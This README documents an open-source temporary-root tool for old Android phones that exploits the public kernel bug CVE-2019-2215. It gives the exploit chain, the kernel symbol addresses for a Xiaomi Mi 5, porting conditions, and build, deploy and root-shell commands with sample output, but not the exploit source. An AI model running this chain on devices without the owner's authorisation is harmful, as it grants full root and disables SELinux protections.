# old-phone-temp-root

老 Android 机的临时 root，基于 **CVE-2019-2215**（binder UAF）。
不刷机、不写分区，重启即失效。

参考实现验证于 Xiaomi Mi 5（Android 6.0.1 / kernel 3.18.20 / arm64）。
同一内核线的其他机型替换内核地址即可，见[移植](#移植)。

```
binder UAF ──► 一次内核任意写 ──► selinux_enforcing = 0
                                  modprobe_path     = payload
           ──► socket(30) ──► request_module() ──► root payload
           ──► setuid su（tmpfs 上）+ unix socket root shell
```

## 参考设备

| 项 | 值 |
|---|---|
| 机型 | Xiaomi Mi 5（`gemini`，msm8996，4 核） |
| 系统 | Android 6.0.1 / MIUI 8.1.3.0 |
| 内核 | `3.18.20-perf-gdf44bb4`，arm64，SLUB，ticket spinlock，KASLR 关闭 |
| 补丁 | 2016-11-01 |
| 验证 | `readv=69708/69708` → `getenforce` = Permissive → `su -c id` = uid 0 |

## 移植

### 前提

1. 2215 未修（2019-10 之前的 Android 内核）
2. arm64
3. KASLR 关闭
4. `binder_thread` 在 kmalloc-512，`wait` 在 `0x48`
5. ticket spinlock（3.18 / 早期 arm64）
6. `CONFIG_MODULES=y`
7. `/data/local/tmp` 可执行

### 范围

| 档 | 范围 | 工作 |
|---|---|---|
| A | 同内核线 3.18.x arm64（msm8996 / msm8953 一代：一加 3/3T、Le Pro 3、ZUK Z2、Nubia Z11、Smartisan M1 等） | 换 `System.map` 里的两个地址。要求 KASLR 关、未开 lockdep（lockdep 会让 `spinlock_t` 变大，`wait` 不再是 0x48） |
| B | 4.4–4.19 | 2215 仍在，但 arm64 已切 qspinlock、4.4 的 `binder_thread` 是 0x190 / `wait`=0xA0、多数还开着 KASLR。需按 `qu1ckr00t` / `kangtastic` 那套重做 |
| C | arm32；2019-10 后已打补丁；KASLR 开且无泄漏；`CONFIG_MODULES=n` | 不支持 |

### 换地址

```bash
python build.py --define A_SELINUX_ENFORCING=0x... --define A_MODPROBE_PATH=0x...
```

`selinux_enforcing` 与 `modprobe_path` 从目标机的 `System.map` 取，源码不用改。

### 判断新机器

```bash
adb shell uname -a                      # 3.18.x? arm64?
adb shell getprop ro.build.version.release
adb shell getenforce
```

再跑触发探针（等价于 `probe26` 的前置检查）：打开 `/dev/binder`，发
`BC_TRANSACTION(handle=0)`，看 `write_consumed=68 / read_consumed=8 /
BR_NOOP + BR_TRANSACTION_COMPLETE`。通过说明 `transaction_stack` 能置上、
`binder_poll` 会挂 `thread->wait`；不通过说明 binder 行为不同，后面的链不用试。

## 依赖

- Python 3.8+
- Android NDK（r21+，脚本自动找 `$ANDROID_NDK_HOME` 或 SDK 默认目录）
- `adb`，设备已开 USB 调试并授权

## 构建

```bash
python build.py
# 或指定 NDK
ANDROID_NDK_HOME=/path/to/ndk python build.py
```

产物在 `bin/`：`probe26`、`trig_sock`、`rootshell`、`su`（aarch64 静态，API 23）。

## 部署

```bash
python deploy.py
# 多台设备时
python deploy.py --serial <serial>
```

脚本依次：push 全部文件到 `/data/local/tmp/` → 跑 `probe26` 做内核写 →
跑 `trig_sock` 触发 `request_module` → 验证 `su -c id` 和 socket root shell。

成功时输出类似：

```
[*] 第 1/3 步：内核写（selinux_enforcing=0，modprobe_path=payload）
  [+] payload=/data/local/tmp/wb.sh selinux=Permissive readv=69708/69708 result=OK
[*] 第 2/3 步：触发 request_module() → root payload
[*] 第 3/3 步：验证
  SELinux   ： Permissive
  su -c id  ： uid=0(root) gid=0(root) groups=0(root) context=u:r:shell:s0
  socket shell： ... uid=0(root) gid=0(root) groups=0(root) context=u:r:kernel:s0
```

`probe26` 打印的 `affinity: Invalid argument` 是参考机只有 4 核、钉 CPU 4 失败导致的，不影响利用。

## 使用

```bash
# 传统 su（不在 PATH 里，也没写 /system）
adb shell /data/local/tmp/.su/su -c id
adb shell /data/local/tmp/.su/su          # 交互

# 在 shell 里直接敲 su
adb shell
export PATH=/data/local/tmp/.su:$PATH
su

# 或者 socket root shell
adb shell /data/local/tmp/rootshell
adb shell /data/local/tmp/rootshell "id; getenforce"
```

socket root shell 的 SELinux 上下文是 `u:r:kernel:s0`（payload 由内核线程拉起）。

### 装 su 给应用（两种）

两种都是把 `su` 放进 `/sbin`（应用 `PATH` 的第一项），区别在权限范围。

**A. setuid 版（受限 root）**

```bash
python allowall.py
```

应用能 setuid 到 0，但 capability 只有自己的 bounding set（`0xc0`），
绕不过 DAC——`ls /data` 会失败。

**B. 客户端版（完整 root，推荐）**

```bash
python suclient.py
```

`/sbin/su` 是 daemon 的客户端，命令交给全 capability（`0x3fffffffff`）的
守护进程执行；支持 `su -c`、交互式 `su`、`su -v`。

部署时也可以一步完成：`python deploy.py --allow-all` 或 `python deploy.py --suclient`。

两种都只在本 boot 有效，重启后 `/sbin` 恢复只读、`su` 消失。

## 目录结构

```
old-phone-temp-root/
├── build.py              # NDK 交叉编译
├── deploy.py             # push + 利用 + 触发 + 验证
├── allowall.py           # setuid su 装进 /sbin（受限 root）
├── suclient.py           # 客户端 su 装进 /sbin（完整 root）
├── cleanup.py            # 卸载 su tmpfs、清残留
├── src/
│   ├── probe26.c         # CVE-2019-2215 利用（readv 自覆写链，一次链双写）
│   ├── trig_sock.c       # socket(30) 触发 request_module
│   ├── rootshell.c       # unix socket root shell（服务端 + 客户端）
│   └── su.c              # 最小 setuid su
├── payload/
│   └── wb.sh             # 内核以 root 执行的脚本
└── docs/
    ├── HOW-IT-WORKS.md   # 漏洞、偏移、链条的完整说明
    └── TROUBLESHOOTING.md
```

## 关键地址

来自参考机 `System.map`（`_text = 0xffffffc000080000`，KASLR 关闭）：

| 符号 | 地址 |
|---|---|
| `selinux_enforcing` | `0xffffffc002283174` |
| `modprobe_path` | `0xffffffc001e37ce0` |

换机型时用上面 `--define` 覆盖，或直接改 `src/probe26.c` 顶部的默认值。

## 限制

- 只在本 boot 有效：重启后 SELinux 回 Enforcing、`modprobe_path` 复原、daemon 消失。
- 运行后 SELinux 是 Permissive，直到重启。
- 依赖 `probe26` 的堆布局（40 个 kmalloc-512 ballast、单 CPU 完成 free/steal）。
  `readv` 返回值不等于 69708 时重跑或重启，不要用它判断写入是否生效。
- `su` 必须在 `/data/local/tmp/.su` 这个 tmpfs 上；`/data` 是 `nosuid`，拷到别处 setuid 不生效。

## 清理

```bash
python cleanup.py
# 彻底恢复：重启设备
```

## 参考

- CVE-2019-2215 原始报告：Google Project Zero issue 1942
- 触发原语与工程实现：`FDLAlfrid/odin-od105-devkit`（kernel 3.18.31 / arm64）
- 4.4 几何：`grant-h/qu1ckr00t`、`kangtastic/cve-2019-2215`
- github.com/DimitriFourny/cve-2019-2215

## 许可

MIT，见 [LICENSE](LICENSE)。`src/probe26.c` 源自上述公开工程（MIT）。
